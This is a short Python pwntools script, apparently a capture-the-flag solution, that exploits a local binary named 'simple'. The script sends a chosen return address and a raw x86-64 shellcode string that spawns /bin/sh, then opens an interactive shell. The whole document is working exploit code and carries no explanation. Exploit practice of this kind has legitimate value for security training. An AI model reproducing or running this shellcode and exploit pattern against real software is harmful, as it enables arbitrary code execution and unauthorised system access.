# encoding: utf-8
from pwn import *

main = 0x00000000004006e7
target = 0x400910 # ra of fclose
sc = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'


r = process('./simple')
r.sendlineafter('addr:', str(target))
r.sendlineafter('buf:', sc)
r.interactive()